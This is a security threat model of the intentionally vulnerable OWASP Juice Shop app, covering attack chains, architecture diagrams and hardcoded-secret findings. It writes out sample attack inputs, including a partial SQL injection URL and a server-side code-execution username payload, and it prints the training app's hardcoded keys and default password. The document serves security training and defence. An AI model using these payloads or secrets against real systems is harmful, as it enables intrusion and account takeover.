# Threat Model — OWASP Juice Shop

> | Field | Value |
> |-------|-------|
> | **Project** | OWASP Juice Shop v19.2.1 |
> | **Repository** | [juice-shop/juice-shop](https://github.com/juice-shop/juice-shop) |
> | **Team** | OWASP Juice Shop project |
> | **Asset Tier** | Tier 1 (intentionally vulnerable — training/demo platform) |
> | **Compliance Scope** | OWASP Top 10, OWASP ASVS |
> | **Commit** | `7380ce7` (master) |

---

## Changelog

| Version | Date | Mode | SHA | Note |
|---------|------|------|-----|------|
| v1 | 2026-04-14 | full | `7380ce7` | Initial assessment — 30 threats, 28 mitigations, 8 components |

---

## Table of Contents

1. [Management Summary](#management-summary)
2. [Critical Attack Chain](#critical-attack-chain)
3. [System Overview](#1-system-overview)
4. [Architecture Diagrams](#2-architecture-diagrams)
   - [2.1 System Context](#21-system-context)
   - [2.2 Containers](#22-containers)
   - [2.3 Components — Authentication Service](#23-components--authentication-service)
   - [2.4 Technology Architecture](#24-technology-architecture)
   - [2.5 Security Architecture Assessment](#25-security-architecture-assessment)
5. [Attack Walkthroughs](#3-attack-walkthroughs)
6. [Assets](#4-assets)
7. [Attack Surface](#5-attack-surface)
8. [Trust Boundaries](#6-trust-boundaries)
9. [Identified Security Controls](#7-identified-security-controls)
10. [Threat Register](#8-threat-register)
11. [Mitigation Register](#9-mitigation-register)
12. [Out of Scope](#10-out-of-scope)
13. [Appendix: Run Statistics](#appendix-run-statistics)

---

## Management Summary

### Verdict

🔴 **Critical security posture — unsuitable for production deployment in current state.**

- **Multiple unauthenticated critical attack paths** exist from the public internet directly to remote code execution, database extraction, and admin account takeover — requiring zero authentication.
- **The RSA private key used to sign all JWT session tokens is hardcoded in source code** and publicly visible on GitHub, enabling any person to forge admin sessions offline.
- **SQL injection is present on both the login and product search endpoints**, giving an unauthenticated attacker full read/write access to the SQLite database containing all user credentials, payment data, and orders.
- **Nine Critical-severity threats** span authentication bypass, SQLi, XSS, RCE, and privilege escalation — any single one constitutes a complete system compromise.

This is, by design, an intentionally vulnerable application. The findings documented here are real vulnerabilities that mirror common production application weaknesses. The threat model serves as a reference for security training and awareness.

### Top Risks

| Severity | ID | Description | Impact | Mitigation | Effort |
|----------|-----|-------------|--------|------------|--------|
| 🔴 Critical | [T-001](#t-001) | RSA private key hardcoded in source | Full JWT forgery / admin takeover | [M-001](#m-001) — Remove key, load from env | Low |
| 🔴 Critical | [T-002](#t-002) | JWT alg:none accepted by express-jwt 0.1.3 | Auth bypass without private key | [M-002](#m-002) — Upgrade express-jwt | Medium |
| 🔴 Critical | [T-003](#t-003) | SQL injection on login endpoint | Admin auth bypass, DB dump | [M-003](#m-003) — Parameterize queries | Medium |
| 🔴 Critical | [T-005](#t-005) | Admin role settable during user registration | Instant privilege escalation | [M-005](#m-005) — Strip role from registration | Low |
| 🔴 Critical | [T-006](#t-006) | SQL injection on product search | Full database extraction (unauthenticated) | [M-003](#m-003) — Parameterize queries | Medium |
| 🔴 Critical | [T-009](#t-009) | Encryption keys + logs exposed unauthenticated | JWT public key theft, log disclosure | [M-008](#m-008) — Restrict file serving | Low |
| 🔴 Critical | [T-013](#t-013) | Systemic XSS via bypassSecurityTrustHtml | Session hijack, admin panel takeover | [M-010](#m-010) — Remove bypass calls | Medium |
| 🔴 Critical | [T-020](#t-020) | RCE via notevil sandbox escape (B2B) | Shell on server | [M-019](#m-019) — Remove eval entirely | High |
| 🔴 Critical | [T-022](#t-022) | SSTI via eval in user profile (authenticated) | Authenticated RCE | [M-020](#m-020) — Remove eval | Low |
| 🟠 High | [T-004](#t-004) | MD5 password hashing — rainbow table reversible | All passwords recoverable post-SQLi | [M-004](#m-004) — Use bcrypt | Medium |
| 🟠 High | [T-007](#t-007) | Systemic IDOR on basket/memory/wallet endpoints | Cross-user data access | [M-006](#m-006) — Add ownership checks | Medium |
| 🟠 High | [T-008](#t-008) | Unauthenticated /metrics, /api-docs, /admin config | System reconnaissance | [M-007](#m-007) — Add auth | Low |
| 🟠 High | [T-019](#t-019) | SSRF via profile image URL upload | Internal network probe | [M-018](#m-018) — Block private IPs | Low |
| 🟠 High | [T-025](#t-025) | In-process SQLite, no encryption at rest | Full DB access via SQLi | [M-023](#m-023) — SQLCipher | High |

*Legend: 🔴 Critical · 🟠 High*

### ⚠ Worst Case Scenarios

<blockquote style="border-left: 3px solid #dc2626; background: #fef2f2; padding: 16px 20px; margin: 0;">

**Scenario 1 — Unauthenticated full system compromise (no login required):**
An external attacker visits `GET /rest/products/search?q=1 UNION SELECT ...`, extracts the entire Users table including MD5 password hashes, cracks the admin password offline (MD5, no salt), and logs in as admin. Alternatively, they download the RSA private key from the public GitHub repository and forge an admin JWT without needing any credentials at all.

**Scenario 2 — Remote code execution from authenticated session:**
A registered user sets their username to `#{require('child_process').execSync('id')}`, visits their profile page, and receives output of the `id` command from the server. The same eval path is accessible via the B2B order endpoint for any user with an account, enabling an infinite loop denial of service or prototype pollution sandbox escape for full RCE.

**Scenario 3 — Mass session hijack via persisted XSS:**
An attacker submits a feedback comment containing JavaScript payload. The admin visits the administration panel — which renders all user emails and feedback using `bypassSecurityTrustHtml()` without sanitization — and the attacker's payload executes, extracting the admin JWT from localStorage and sending it to an external host.

**→ See [Critical Attack Chain](#critical-attack-chain) for the full exploitation graph.**

</blockquote>

### Architecture Assessment

| Severity | Layer | Defect | Consequence | Enables |
|----------|-------|--------|-------------|---------|
| 🔴 Critical | Authentication | **No key isolation** — RSA private key co-located with application logic in source code | Any reader of the public repo can forge admin tokens | [T-001](#t-001) — JWT forgery |
| 🔴 Critical | Data Access | **Raw SQL string interpolation** — no parameterized queries in login or search routes | Unauthenticated full database extraction | [T-003](#t-003) — Login SQLi<br/>[T-006](#t-006) — Search SQLi |
| 🔴 Critical | Input Handling | **eval() in production request path** — username and B2B order data evaluated as JavaScript | Authenticated and semi-authenticated RCE | [T-020](#t-020) — B2B RCE<br/>[T-022](#t-022) — SSTI |
| 🟠 High | Authorization | **No server-side ownership checks** on resource endpoints | Authenticated users access other users' data | [T-007](#t-007) — Systemic IDOR |
| 🟠 High | Frontend | **JWT in localStorage + XSS** — bypassSecurityTrustHtml enables script injection that can steal localStorage tokens | Complete session takeover via XSS | [T-013](#t-013) — XSS<br/>[T-014](#t-014) — Token theft |

*Legend: 🔴 Critical · 🟠 High*

### Follow-up Actions

| Priority | Mitigation | Why | Effort |
|----------|-----------|-----|--------|
| P2 | [M-004](#m-004) — Replace MD5 with bcrypt | Cracked in seconds after any DB dump | Medium |
| P2 | [M-006](#m-006) — Add IDOR ownership checks | Authenticated users access any account's data | Medium |
| P2 | [M-009](#m-009) — Fix NoSQL injection | Mass review overwrite via operator injection | Low |
| P2 | [M-010](#m-010) — Remove bypassSecurityTrustHtml | Enables stored XSS in admin panel | Medium |
| P2 | [M-011](#m-011) — JWT to httpOnly cookies | Token theft via any XSS | High |
| P2 | [M-013](#m-013) — Add token revocation | Stolen tokens remain valid for 6 hours | Medium |
| P2 | [M-015](#m-015) — Block SSRF on profile image URL | Internal network probe via any URL | Low |
| P2 | [M-016](#m-016) — Disable XXE | File disclosure via XML upload | Low |
| P2 | [M-017](#m-017) — Fix Zip Slip | Arbitrary file write via crafted zip | Low |
| P2 | [M-018](#m-018) — Add YAML size limit | Node.js OOM crash via YAML bomb | Low |
| P2 | [M-021](#m-021) — Enforce role server-side | Client-controlled role in PUT body | Low |
| P2 | [M-022](#m-022) — Server-side admin role check | Client-side guard bypass | Medium |
| P2 | [M-024](#m-024) — Require current password | Password change without re-auth | Low |
| P2 | [M-025](#m-025) — Rotate Alchemy API key | Hardcoded WebSocket key on GitHub | Low |
| P3 | [M-026](#m-026) — Structured security event logging | No audit trail for security events | Medium |
| P3 | [M-027](#m-027) — CI/CD code review gates | No reviewer requirement on master | Low |
| P3 | [M-023](#m-023) — SQLite encryption at rest | DB file readable if container compromised | High |
| P3 | [M-028](#m-028) — Open redirect allowlist | Phishing launchpad via trusted domain | Low |
| P4 | [M-008](#m-008) — Restrict CORS to known origins | Any origin can make credentialed requests | Low |

### Operational Strengths

| Control | What it provides | Limitation |
|---------|-----------------|------------|
| Distroless Docker base image | Minimal attack surface; no shell, no package manager in runtime image | Application vulnerabilities still exploitable; does not prevent RCE via Node.js |
| Non-root container user (65532) | Prevents privilege escalation to root within the container | File writes to group-writable dirs (ftp, data, i18n) still possible |
| GitHub Actions with SHA-pinned Actions | Prevents supply chain substitution of CI/CD tooling | postinstall scripts in dependencies still execute |
| CodeQL SAST scanning | Detects known vulnerability patterns in TypeScript source | Cannot detect all injection patterns; intentional vulns are expected to trigger |
| OWASP ZAP DAST scanning | Dynamic analysis of running application | Not all endpoints covered; intentional vulns not remediated |
| Morgan HTTP access logging | Request-level audit trail for forensics | Does not log security events (login failure, admin actions) separately |
| Two-Factor Authentication (TOTP) | Optional second factor for login | Not enforced for admin accounts; can be bypassed via SQLi |
| Partial Helmet integration (noSniff, frameguard) | Prevents MIME sniffing and clickjacking | XSS filter disabled; no CSP globally; HSTS not configured |

**Bottom line:** The defensive controls in place are meaningful for an intentionally vulnerable training application but collectively insufficient for any production use. The architectural gaps (hardcoded keys, raw SQL, eval in request paths) are systemic and precede any per-control hardening.

---

## Critical Attack Chain

The diagrams below show how Critical findings combine into distinct attacker workflows. Nodes link directly to their full detail rows in Section 8.1.

### Chain 1 — Unauthenticated Database Extraction and Admin Takeover

```mermaid
graph LR
    classDef crit fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    Start(["Unauthenticated\nattacker"]):::crit
    T006["T-006\nSearch SQLi\nUNION SELECT users"]:::crit
    T004["T-004\nMD5 cracking\nRainbow tables"]:::crit
    T003["T-003\nLogin SQLi\nor admin' comment"]:::crit
    T001["T-001\nForge admin JWT\nHardcoded RSA key"]:::crit
    Goal(["Full admin access\n+ DB dump"]):::crit
    Start -->|"GET /rest/products/search?q=1 UNION..."| T006
    T006 -->|"Users table extracted"| T004
    T004 -->|"Admin password cracked"| T003
    Start -->|"GitHub — download private key"| T001
    T001 -->|"Sign admin JWT offline"| Goal
    T003 -->|"Authenticate as admin"| Goal
```

**Key takeaway:** An unauthenticated attacker can compromise the entire database and forge admin sessions using two independent paths that both require zero prior access — the hardcoded private key on GitHub, or the raw SQL injection on the search endpoint.

### Chain 2 — Authenticated RCE via B2B Endpoint or SSTI

```mermaid
graph LR
    classDef crit fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    Start(["Registered user\n(any account)"]):::crit
    T005["T-005\nRegister with\nrole: admin"]:::crit
    T022["T-022\nSSTS via eval\nusername: #{exec(...)}\n"]:::crit
    T020["T-020\nB2B notevil escape\norderLinesData payload"]:::crit
    Goal(["Remote code execution\non Node.js process"]):::crit
    Start -->|"POST /api/Users role: admin"| T005
    T005 -->|"Admin session"| T022
    Start -->|"Set username to #{...}"| T022
    Start -->|"POST /rest/b2b/v2/orders"| T020
    T022 -->|"eval() on profile request"| Goal
    T020 -->|"Prototype pollution escape"| Goal
```

**Key takeaway:** Any registered user (including self-registered accounts) can reach remote code execution through two separate eval paths — neither requires admin privileges.

---

## 1. System Overview

OWASP Juice Shop is a deliberately insecure web application published by the OWASP Foundation. It is built with Node.js and Angular and contains hundreds of intentional security vulnerabilities across every OWASP Top 10 category, making it the most comprehensive training target available for application security education. It is deployed as a Docker image and used in CTF events, security training programs, and awareness workshops worldwide.

**Architecture complexity tier: Complex.** The application has a clear multi-tier architecture (Angular SPA, Express REST API, SQLite + MarsDB data layer, plus auxiliary components including a file upload handler, B2B order processor, chatbot, and Web3/NFT module), each with distinct security characteristics requiring separate analysis.

**Compliance scope:** OWASP Top 10 2021, OWASP ASVS. All Top 10 categories are intentionally represented.

**Context sources:** Cached context file (no external endpoint configured); business context from `.threat-modeling-context.md`. No requirements YAML configured.

**Overall security posture:** As an intentionally vulnerable application, every critical vulnerability class is represented. The threat model documents real exploitable conditions that map directly to production application weaknesses. From a defensive standpoint, the application has some operational controls (distroless Docker image, non-root user, SHA-pinned CI/CD actions, CodeQL scanning) but the application code layer is comprehensively insecure by design.

---

## 2. Architecture Diagrams

The following diagrams model the system architecture at different abstraction levels using the C4 model. Security-relevant components are highlighted. Red nodes carry at least one Medium-or-higher threat.

### 2.1 System Context

The Context view shows who interacts with the system, which external services it depends on, and which trust zones each actor sits in. The most important observation: every actor — including unauthenticated attackers — reaches the Express monolith directly on port 3000 with no gateway or WAF in front.

```mermaid
graph TD
    classDef person fill:#08427B,stroke:#073B6F,color:#fff
    classDef system fill:#1168BD,stroke:#0E5CA8,color:#fff
    classDef external fill:#999,stroke:#666,color:#fff
    classDef db fill:#2E7D32,stroke:#1B5E20,color:#fff
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px

    subgraph INTERNET["Public Internet (untrusted)"]
        User["User\nBrowser / curl"]:::person
        Attacker["Attacker\nUnauthenticated"]:::person
        Admin["Administrator\nBrowser"]:::person
    end

    subgraph APP["Application Tier (port 3000)"]
        %% component: rest-api
        JuiceShop["OWASP Juice Shop\nNode.js 24 / Express 4\nAngular 20 SPA\nv19.2.1"]:::risk
    end

    subgraph DATA["Data Tier (in-process)"]
        %% component: data-layer
        SQLite["SQLite\nSequelize 6\nUsers, Products, Cards"]:::risk
        MarsDB["MarsDB\nmarsdb 0.6.11\nOrders, Reviews"]:::db
    end

    subgraph EXTERNAL["External Services"]
        GitHub["GitHub\nPublic Repository\n(contains RSA private key)"]:::external
        Alchemy["Alchemy\nEthereum Node\nWebSocket API"]:::external
    end

    User -->|"HTTPS · port 3000"| JuiceShop
    Attacker -->|"HTTP · unauthenticated"| JuiceShop
    Admin -->|"HTTPS · port 3000"| JuiceShop
    JuiceShop -->|"SQL · in-process"| SQLite
    JuiceShop -->|"NoSQL · in-process"| MarsDB
    JuiceShop -->|"WSS · external API"| Alchemy
    Attacker -->|"HTTPS · read source code + private key"| GitHub

    %% Trust Boundary Key:
    %% Internet → App: No gateway/WAF; all traffic hits port 3000 directly
    %% App → Data: No network boundary; in-process databases; SQLi = direct DB access
    %% App → Alchemy: Outbound WebSocket; API key hardcoded in source
```

**Key takeaway:** Every external request — including an unauthenticated attacker — reaches the Express monolith directly on port 3000 with no API gateway, WAF, or rate limiting in front of the critical injection endpoints.

### 2.2 Containers

The Container view zooms into the deployable units. The critical observation: all three data stores run in-process within the same Node.js container, meaning SQL injection or NoSQL injection grants direct access to all stores with no network hop required.

```mermaid
graph TD
    classDef person fill:#08427B,stroke:#073B6F,color:#fff
    classDef system fill:#1168BD,stroke:#0E5CA8,color:#fff
    classDef db fill:#2E7D32,stroke:#1B5E20,color:#fff
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px

    subgraph INTERNET["Public Internet (untrusted)"]
        Browser["Browser\nAngular SPA\n(served statically)"]:::person
        ExtAttacker["Attacker"]:::person
    end

    subgraph CONTAINER["Docker Container · gcr.io/distroless/nodejs24 · port 3000 · user 65532"]
        %% component: rest-api
        ExpressAPI["Express REST API\nNode.js 24 / TypeScript\n~60 route handlers\nserver.ts + routes/"]:::risk
        %% component: frontend-spa
        AngularSPA["Angular 20 SPA\nTypeScript\nfrontend/dist (served static)\nJWT in localStorage"]:::risk
        %% component: auth-service
        AuthLib["Auth Service\nexpress-jwt 0.1.3\njsonwebtoken 0.4.0\nlib/insecurity.ts"]:::risk
        %% component: file-upload
        FileUpload["File Upload\nmulter + libxmljs2\nroutes/fileUpload.ts\nSSRF, XXE, ZipSlip"]:::risk
        %% component: b2b-processor
        B2BProc["B2B Processor\nnotevil sandbox\nroutes/b2bOrder.ts\nRCE vector"]:::risk
        %% component: data-layer
        SQLiteDB["SQLite DB\nSequelize 6\nin-process · sqlite3"]:::db
        MarsDBComp["MarsDB\nmarsdb 0.6.11\nin-process · NoSQL"]:::db
    end

    subgraph FS["File System (container)"]
        FTPDir["ftp/ directory\nPublicly accessible"]:::risk
        EncKeys["encryptionkeys/\nJWT public key\nPublicly accessible"]:::risk
        Logs["logs/\nAccess logs\nPublicly accessible"]:::risk
        Uploads["uploads/\ncomplaint files"]:::db
    end

    Browser -->|"HTTPS · GET /api/* REST"| ExpressAPI
    ExtAttacker -->|"HTTP · unauthenticated SQLi/RCE"| ExpressAPI
    ExpressAPI -->|"serves Angular static assets"| AngularSPA
    ExpressAPI -->|"JWT create/verify"| AuthLib
    ExpressAPI -->|"file parse + SSRF"| FileUpload
    ExpressAPI -->|"eval orderLinesData"| B2BProc
    ExpressAPI -->|"SQL · in-process"| SQLiteDB
    ExpressAPI -->|"NoSQL · in-process"| MarsDBComp
    ExpressAPI -->|"HTTP · serves public"| FTPDir
    ExpressAPI -->|"HTTP · serves public"| EncKeys
    ExpressAPI -->|"HTTP · serves public"| Logs
    FileUpload -->|"writes uploads"| Uploads

    %% Trust Boundary Key:
    %% Internet → Container: No WAF/gateway; port 3000 exposed directly
    %% Container → SQLite/MarsDB: In-process; injection = direct DB access
    %% Container → FS: File system access; path traversal = arbitrary write
```

**Key takeaway:** The entire application — API, auth logic, file handling, and both databases — runs in a single process. There is no isolation boundary between components; a successful injection in any route handler has immediate access to all data stores and the file system.

### 2.3 Components — Authentication Service

The Component view drills into the Authentication Service, which is the highest-risk component. The critical finding: signing key, verification logic, and token issuance all live in a single file with the private key hardcoded as a string literal.

```mermaid
graph TD
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    classDef ok fill:#c8e6c9,stroke:#388e3c,color:#000

    subgraph AUTH["Authentication Service — lib/insecurity.ts"]
        PrivKey["Private Key\nHardcoded RSA PEM\nlib/insecurity.ts:23"]:::risk
        PubKey["Public Key\nencryptionkeys/jwt.pub\n(publicly downloadable)"]:::risk
        Signer["jwt.sign()\nRS256 · 6h expiry\nlib/insecurity.ts:56"]:::risk
        Verifier["jws.verify()\nNO algorithm enforcement\nlib/insecurity.ts:57"]:::risk
        TokenMap["In-memory token map\nauthenticatedUsers.tokenMap\nno persistence / no revocation"]:::risk
        Hasher["MD5 hash\ncrypto.createHash('md5')\nlib/insecurity.ts:42"]:::risk
        JWTMid["express-jwt 0.1.3\nisAuthorized() middleware\nlib/insecurity.ts:54"]:::risk
    end

    subgraph LOGIN["Login Route — routes/login.ts"]
        LoginSQL["Raw SQL query\nString interpolation\nroutes/login.ts:34"]:::risk
        LoginHandler["login() handler"]:::ok
    end

    subgraph RESET["Password Reset — routes/resetPassword.ts"]
        SecurityQ["Security question\nHMAC comparison\nroutes/resetPassword.ts"]:::ok
        PasswordUpdate["UserModel.update(password)\nno re-auth after reset"]:::ok
    end

    LoginSQL -->|"authenticates user"| LoginHandler
    LoginHandler -->|"signs JWT"| Signer
    Signer -->|"uses"| PrivKey
    JWTMid -->|"verifies with"| Verifier
    Verifier -->|"uses"| PubKey
    LoginHandler -->|"stores token"| TokenMap
    LoginSQL -->|"password hashed via"| Hasher

    %% Trust Boundary Key:
    %% LoginRoute → Auth: no algorithm enforcement; alg:none accepted
    %% PrivKey: publicly accessible via GitHub — offline forgery possible
    %% PubKey: downloadable at /encryptionkeys/jwt.pub unauthenticated
```

**Key takeaway:** The authentication chain has three independent critical breaks — SQL injection bypasses the credential check, alg:none bypasses signature verification, and the hardcoded private key enables offline forgery — any single break yields full authentication bypass.

### 2.4 Technology Architecture

This diagram shows the runtime middleware stack from top to bottom. Nodes highlighted in red carry Critical or High threats.

```mermaid
graph TD
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    classDef warn fill:#FFE082,stroke:#F57F17,color:#000
    classDef ok fill:#c8e6c9,stroke:#388e3c,color:#000

    subgraph CLIENT["Browser — Client Tier"]
        Angular["Angular 20 SPA\nTypeScript\nJWT in localStorage"]:::risk
        LocalStorage["localStorage\nJWT token\nXSS-accessible"]:::risk
    end

    subgraph MIDDLEWARE["Express Middleware Stack — port 3000"]
        CORS["cors() — wildcard\nAll origins allowed"]:::risk
        Helmet["helmet 4.6.0\nnoSniff + frameguard only\nxssFilter DISABLED"]:::risk
        BodyParser["body-parser\nurlencode + JSON + text"]:::ok
        Morgan["Morgan logging\nHTTP access log"]:::ok
        JWT["express-jwt 0.1.3\nisAuthorized() middleware"]:::risk
        RateLimit["express-rate-limit 7.x\nreset-password only"]:::warn
    end

    subgraph ROUTES["Route Handlers — routes/*.ts"]
        LoginRoute["routes/login.ts\nRaw SQL — SQLi"]:::risk
        SearchRoute["routes/search.ts\nRaw SQL — SQLi"]:::risk
        FileRoute["routes/fileUpload.ts\nXXE + ZipSlip + YAML bomb"]:::risk
        B2BRoute["routes/b2bOrder.ts\neval() + notevil — RCE"]:::risk
        ProfileRoute["routes/userProfile.ts\neval() — SSTI"]:::risk
        PublicRoutes["routes/ftp, encryptionkeys, logs\nUnauthenticated file serving"]:::risk
    end

    subgraph DATA["Data Tier — in-process"]
        Sequelize["Sequelize 6\nSQLite 3"]:::risk
        MarsDB2["MarsDB 0.6.11\nNoSQL in-process"]:::warn
    end

    Angular -->|"JWT in Authorization header"| CORS
    CORS -->|"allows all origins"| Helmet
    Helmet -->|"partial headers"| BodyParser
    BodyParser -->|"parsed body"| Morgan
    Morgan -->|"logged"| JWT
    JWT -->|"decoded token"| RateLimit
    RateLimit -->|"routed"| LoginRoute
    RateLimit -->|"routed"| SearchRoute
    RateLimit -->|"routed"| FileRoute
    RateLimit -->|"routed"| B2BRoute
    RateLimit -->|"routed"| ProfileRoute
    RateLimit -->|"routed"| PublicRoutes
    LoginRoute -->|"raw SQL query"| Sequelize
    SearchRoute -->|"raw SQL query"| Sequelize
    ProfileRoute -->|"eval username"| ProfileRoute
    B2BRoute -->|"safeEval orderLinesData"| B2BRoute
    Sequelize -->|"SQLite file"| DATA
    MarsDB2 -->|"in-memory"| DATA
```

**Key takeaway:** Rate limiting is applied only to the password reset endpoint; both SQL injection vectors (login and search) are fully unthrottled, meaning automated extraction attacks face no delay or lockout.

### 2.5 Security Architecture Assessment

The assessment below evaluates structural patterns rather than individual code defects. Each pattern is rated as present, partially implemented, or absent based on code and configuration evidence.

#### 2.5.1 Architecture Patterns

The following table evaluates which security architecture patterns are implemented. Each pattern is rated based on code and configuration evidence.

| Pattern | Status | Assessment |
|---------|--------|------------|
| API Gateway | ❌ Absent | No centralized gateway in front of Express. Authentication, rate limiting, and request validation must be implemented per-route, leading to inconsistent enforcement — evidenced by the fact that /metrics and /ftp require no auth while /basket requires a JWT. |
| BFF (Backend for Frontend) | ❌ Absent | The Angular SPA calls the REST API directly. Without a BFF, the SPA holds JWT tokens in localStorage where any XSS can steal them. No token mediation layer exists. |
| Defense-in-Depth | ❌ Absent | Application security relies entirely on per-route logic. No WAF, no input validation gateway, no anomaly detection. Bypassing one check (e.g., alg:none on JWT) yields full access — there is no second layer. |
| Separation of Concerns | ⚠️ Partial | Auth logic is centralized in `lib/insecurity.ts`, which is a correct pattern. However, the same file contains the hardcoded private key, making the trust boundary meaningless. Route handlers mix business logic with security enforcement inconsistently. |
| Least Privilege | ⚠️ Partial | Docker runs as non-root user 65532, and the distroless image removes unnecessary system binaries. However, ftp/, data/, and i18n/ directories are group-writable, and the application has unrestricted filesystem access within the container. |
| Secrets Management | ❌ Absent | No secrets management. RSA private key, HMAC key, Alchemy API key, and cookie signing secret are all hardcoded in source code committed to a public GitHub repository. |
| Network Segmentation | ❌ Absent | No network segmentation. Both databases run in-process with the application logic. No firewall rules between application and data tiers. Port 3000 exposed directly with no reverse proxy. |
| Secure Defaults | ❌ Absent | Multiple insecure defaults: CORS wildcard, admin password 'admin123', MD5 hashing, XSS filter disabled, JWT algorithm unenforced. The application ships with deliberate insecure defaults as part of its training purpose. |

**Assessment:** 0 of 8 security architecture patterns are fully present. 2 are partially implemented (Separation of Concerns, Least Privilege). This is the lowest possible architecture rating and is consistent with the intentionally vulnerable design. Any deployment of this application must be treated as a fully compromised environment.

#### 2.5.2 Key Architectural Risks

The following table identifies structural design decisions that amplify or enable individual vulnerabilities. These are not code-level bugs but architecture-level defects — fixing individual threats without addressing the underlying structural risk leaves the system exposed to the same class of attack through different vectors.

| Risk | Structural Risk | Why this matters | Linked Threats |
|------|----------------|-----------------|----------------|
| 🔴 Critical | **No key isolation** — RSA private key co-located with application code in a public repository | A correctly designed architecture keeps signing keys in a hardware security module or secrets vault, never in application source. Here, the key is readable by anyone with internet access, making all authentication controls irrelevant. | [T-001](#t-001) — JWT forgery |
| 🔴 Critical | **Raw SQL construction** — no consistent use of parameterized queries in the ORM | Every route that builds a SQL query with string interpolation is a potential injection point. The architecture has no data access layer that enforces parameterization; developers must remember to use the ORM correctly on every single query. | [T-003](#t-003) — Login SQLi<br/>[T-006](#t-006) — Search SQLi |
| 🔴 Critical | **eval() in request path** — JavaScript evaluation of user input in two separate production code paths | A correctly designed system never evaluates user-supplied strings as code. The presence of eval() in username processing and in the B2B order handler means any bypass of the surrounding guards (challenge flags, etc.) yields immediate RCE. | [T-020](#t-020) — B2B RCE<br/>[T-022](#t-022) — Profile SSTI |
| 🟠 High | **No data-tier isolation** — SQLite and MarsDB run in-process with no network boundary | Successful injection in any route handler grants the attacker the same database access as the application process itself, including all tables. A correctly designed architecture places the database on a separate network segment with a dedicated service account. | [T-025](#t-025) — SQLite access |
| 🟠 High | **Angular sanitization deliberately bypassed** — bypassSecurityTrustHtml() used across multiple components | Angular's XSS protection is disabled not once but in at least 6 separate component locations. Fixing one does not fix the pattern — the architectural decision to bypass sanitization must be reversed globally. | [T-013](#t-013) — Systemic XSS |

#### 2.5.3 Secret Management

```mermaid
graph TD
    subgraph CURRENT["Current state (insecure)"]
        SrcCode["lib/insecurity.ts\n(public GitHub repo)"]:::risk
        PrivKeyHard["RSA Private Key\nhardcoded PEM block:23"]:::risk
        HMACKeyHard["HMAC Key\n'pa4qacea4VK9t9nGv7yZtwmj':43"]:::risk
        AlchemyHard["Alchemy API Key\nhardcoded in nftMint.ts:15"]:::risk
        CookieHard["Cookie secret\n'kekse' in cookieParser()"]:::risk
    end
    subgraph TARGET["Target architecture"]
        EnvVars["process.env.*\nor secrets mount"]:::ok
        Vault["HashiCorp Vault\nor AWS Secrets Manager"]:::ok
    end
    SrcCode --> PrivKeyHard
    SrcCode --> HMACKeyHard
    SrcCode --> AlchemyHard
    SrcCode --> CookieHard
    PrivKeyHard -.->|"should be"| Vault
    HMACKeyHard -.->|"should be"| EnvVars
    AlchemyHard -.->|"should be"| EnvVars
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    classDef ok fill:#c8e6c9,stroke:#388e3c,color:#000
```

**Key takeaway:** All four secret types are hardcoded in source committed to a public repository — none require any access control to obtain.

**Current state.** All application secrets are hardcoded in source code at [lib/insecurity.ts:23](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:23) (RSA private key), [lib/insecurity.ts:43](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:43) (HMAC key `pa4qacea4VK9t9nGv7yZtwmj`), [routes/nftMint.ts:15](vscode://file/home/mrohr/juice-shop/routes/nftMint.ts:15) (Alchemy API key), and the cookie parser at `server.ts:289` (secret 'kekse').

**Structural defects:**

- RSA private key PEM block in source at [lib/insecurity.ts:23](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:23) — publicly visible on GitHub
- HMAC signing key hardcoded at [lib/insecurity.ts:43](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:43) — used for security answer verification
- Alchemy WebSocket API key hardcoded at [routes/nftMint.ts:15](vscode://file/home/mrohr/juice-shop/routes/nftMint.ts:15) — financial impact if abused
- Cookie parser secret 'kekse' hardcoded — allows cookie forgery
- No secret rotation mechanism exists
- No secret scanning configured (GitHub secret scanning would normally flag the RSA key)

**Impact.** Any GitHub user can extract the RSA private key and sign arbitrary JWTs as admin, and use the Alchemy API key at the project's expense. There is no time window to detect and rotate before exploitation.

**Target architecture.** Load the RSA private key from `process.env.JWT_PRIVATE_KEY` or a mounted secret at `/run/secrets/jwt_private_key`. Use HashiCorp Vault or AWS Secrets Manager for the private key with automatic rotation every 90 days. Load all other secrets from environment variables set at container startup.

**Linked threats:**

- [T-001](#t-001) — Hardcoded RSA private key — JWT forgery
- [T-028](#t-028) — Hardcoded Alchemy API key

#### 2.5.4 Authentication

**Current state.** RS256 JWT issued on login via [lib/insecurity.ts:56](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:56) (`jwt.sign(user, privateKey, { algorithm: 'RS256' }`). Token verification at [lib/insecurity.ts:57](vscode://file/home/mrohr/juice-shop/lib/insecurity.ts:57) uses `jws.verify()` which accepts any algorithm including none. express-jwt 0.1.3 is used as middleware — this version predates algorithm enforcement.

```mermaid
graph TD
    classDef risk fill:#FFB6C1,stroke:#c00,color:#000,stroke-width:2px
    classDef ok fill:#c8e6c9,stroke:#388e3c,color:#000

    subgraph CLIENT2["Browser"]
        LoginForm["Login Form\nPOST /rest/user/login"]:::ok
        LS2["localStorage\nJWT token\nXSS-accessible"]:::risk
    end
    subgraph SERVER2["Express Monolith"]
        LoginRoute2["routes/login.ts:34\nRaw SQL — SQLi possible"]:::risk
        Insecurity["lib/insecurity.ts\njwt.sign() + RSA key HARDCODED"]:::risk
        JWSVerify["jws.verify()\nalg:none accepted\nlib/insecurity.ts:57"]:::risk
        JWTMiddle["express-jwt 0.1.3\nno algorithm enforcement"]:::risk
        Protected["Protected Routes\nisAuthorized() middleware"]:::ok
    end
    LoginForm -->|"POST credentials"| LoginRoute2
    LoginRoute2 -->|"if valid, sign JWT"| Insecurity
    Insecurity -->|"JWT in response body"| LS2
    LS2 -->|"Authorization: Bearer"| JWSVerify
    JWSVerify -->|"decoded user object"| JWTMiddle
    JWTMiddle -->|"next() if valid"| Protected
```

